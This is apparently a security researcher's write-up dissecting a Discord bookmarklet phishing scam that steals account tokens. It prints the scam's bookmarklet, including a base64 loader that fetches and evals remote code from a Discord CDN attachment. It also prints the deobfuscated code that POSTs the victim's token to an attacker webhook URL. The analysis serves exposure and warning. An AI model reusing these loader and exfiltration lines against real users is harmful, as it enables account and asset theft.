## 📒 Introduction

**Scam Website:** https://projectgodjira.com/

I am neutral when it comes to NFTs. Recently, someone from a NFT community notfied me about this new scam involving bookmarklets, and a phishing website to steal Discord accounts and any linked NFTs.

**How the underlying scam works:**
1. The victim is DMed a link via Discord. The website in this DM is `https://projectgodjira.com/`. (The scam website)
2. When visitng this website, you are prompted to drag and drop a bookmarklet into your bookmark tray.
3. Upon clicking the bookmarklet, you are prompted to enter a "verification key" to gain access to their Discord server. 
4. As soon as that dialog is submitted, your Discord token is sent through a webhook to their Discord server.

**Quick Notes:**
- It appears they have linked a legit Twitter NFT service on their website to trick users: https://twitter.com/PGodjira.
- After using a BetterDiscord plugin to find hidden channels, there was a channel in their server named `#mod-logs`.
- The functionality of this bookmarklet is similiar to my repo: https://github.com/GalaxzyDev/MiniTokenMonster.

## 👀 First Glance
1. This is the bookmarklet hosted on the scam website at first glance:
```js
javascript:window.prompt('Enter your whitelist key:');eval(/*xmarksthespot.*/atob(/*Whitelist.*/'ZmV0Y2goImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzkzOTM0MTk1NzcyMzk3OTc3Ni85MzkzNDM2MzM3MTc1NTkzMjYvbWVzc2FnZS50eHQiKS50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkudGhlbihzdWNjZXNzID0+IGV2YWwoc3VjY2Vzcykp'))
```
2. The window.prompt() event is useless, lets get rid of this; as well as the comments. 

```js
javascript:eval(atob('ZmV0Y2goImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzkzOTM0MTk1NzcyMzk3OTc3Ni85MzkzNDM2MzM3MTc1NTkzMjYvbWVzc2FnZS50eHQiKS50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkudGhlbihzdWNjZXNzID0+IGV2YWwoc3VjY2Vzcykp'))
```
3. This is obviously code in base64, being decoded by the JavaScript `atob()` function, then ran. Lets go ahead and decode this.
```js
javascript:eval("fetch('https://cdn.discordapp.com/attachments/939341957723979776/939343633717559326/message.txt').then(response => response.text()).then(success => eval(success))")
```

4. We can now see a Discord CDN attachment, where they have hidden the rest of their "malware."
   - This code is most likely obfuscated with https://obfuscator.io/.

## 🚧 Going Deeper
1. I first used https://lelinhtinh.github.io/de4js/ to clean things up and format the obfuscated code.
2. I searched for strings such as `method`, `body`, and `fetch()` and came across the code below.
  ```js
_0x188590[_0x4444dd('0x39d', '0x344', '0x378', 'XRyX', 0x36d) + 'nt'] = _0x24e573(0xd9, '0qqU', '0xc6', 0xf5, 0x96) + _0x24e573(0x9, '*sVU', 0x105, -'0x35', 0x121) + _0x5d3af8(-0x72, -0x24b, '0qqU', -0x167, -0x10f) + ': ' + _0x15825c, fetch(_0x4444dd(0x393, 0x3d0, '0x32e', 'Azem', '0x2be') + _0x5735dc(0x15, 0xa9, 'gvqV', -'0x3b', 0x70) + _0x4444dd(0x38a, 0x46f, 0x3ec, 'Azem', '0x428') + _0x5d3af8(-0x11f, -'0x104', '*sVU', -0x2e, -'0x8f') + _0x4444dd(0x58f, 0x553, 0x491, '#T)l', 0x59c) + _0x24e573('0x1c', 'oe#2', 0x91, -0x21, -0x19) + _0x4444dd(0x3d1, 0x4a0, 0x45f, 'w2LG', 0x3f7) + _0x4444dd('0x418', 0x4df, 0x4d1, ')dR0', 0x3e7) + _0x24e573('0x6b', '0qqU', 0x83, 0x8e, -0x75) + _0x24e573(0xb8, 'CttX', 0x116, -'0x24', 0x90) + _0x5735dc(0x14b, 0xdd, 'Yqd8', '0x17c', '0xd2') + _0x1564d3(-0x167, 'Qa)H', -0xaf, -'0x140', 0x4e) + _0x24e573(-0x34, '7R#O', '0xe', 0x64, -'0x6d') + _0x4444dd('0x3c7', '0x27e', '0x347', '*AOY', 0x29e) + _0x5d3af8(-0x1cf, -0x6c, 'l2J&', -'0x105', -0x189) + _0x24e573(-0xfc, 'w2LG', -'0x17e', -'0x1ed', -0x7c) + _0x24e573('0x3a', '4]PG', 0x42, 0x79, -0x93) + _0x5735dc(0x71, 0x1ce, '*sVU', 0x1c9, '0x146') + _0x1564d3(-'0x1c3', 'w2LG', -'0x2ae', -0x31e, -'0x27e') + _0x4444dd(0x3b8, 0x44a, '0x3c9', 'Ykiw', '0x2f4') + _0x5d3af8(-0x1a8, -'0x1d', 'CttX', -'0xce', -'0x1c7') + _0x5d3af8(-0x22, -'0x1ce', 'CttX', -'0xe7', -'0x122') + _0x24e573(-'0x8e', 'Yqd8', -0x116, -0xa7, -'0x175') + _0x24e573(-0x96, 'wQ7E', -'0x170', -0x37, 0x60), {
    'method': _0x24e573(-0x12, '#T)l', 0x41, -'0x19', 0xf7),
    'headers': _0x451189,
    'body': JSON[_0x5735dc(0x1e1, -0x39, 'Yqd8', -'0x2', 0xde) + _0x5735dc(0x118, 0xb, '#qiQ', 0x1c6, '0xfd')](_0x188590)
}), alert(_0x1564d3(-0x61, 'Ykiw', -0x161, -0x97, -0x187) + _0x5735dc('0x285', 0xdf, 'PqTf', 0x286, '0x1c6') + _0x5735dc('0x17c', '0xf7', '#qwt', '0x140', 0xf2) + _0x5d3af8(-0x9, -'0x88', 'Oiv%', -'0xc1', -0x85) + _0x5735dc(0xea, '0x233', 'PYo$', 0x118, 0x1eb));
   ```
3. After a few `alert()` and `JSON.stringify()` functions later, the code above can be deobfuscated to:
 ```js
fetch("https://discord.com/api/webhooks/939322818280185906/ZkaQPqSP-vOrUdIObzR0QsU65jYkcoU6s7YEFjQphrhE_IOOHkDD2B-ip8hOFC4x9Tpa", {
  'method': 'POST',
  'headers': {'Content-Type': 'application/json'},
  'body': JSON.stringify({"username":"Logger","content":"@everyone Token: <VICTIMS DISCORD TOKEN>"})
}), alert("You have been whitelisted successfully!");
 ```

4. This makes it obvious that this is a scam, not to mention, it being a bookmarklet. 
   - The victims token will be sent over the webhook to their Discord server `#mod-logs` hidden channel.

## ⛔ Heads up!
People have fallen for this, due to this tactic not being widely seen. I hate to see people loose time and money due to this. Remember the notes below.
- If you are prompted to add a bookmarklet, proceed with caution! Bookmarklets can become way more complex than this scam.
- Do not leave sensitive information lying around in your Discord account! There are lots of grabbers nowdays, lmfao.
- Dont believe Discord DM advertisements, they are always false.
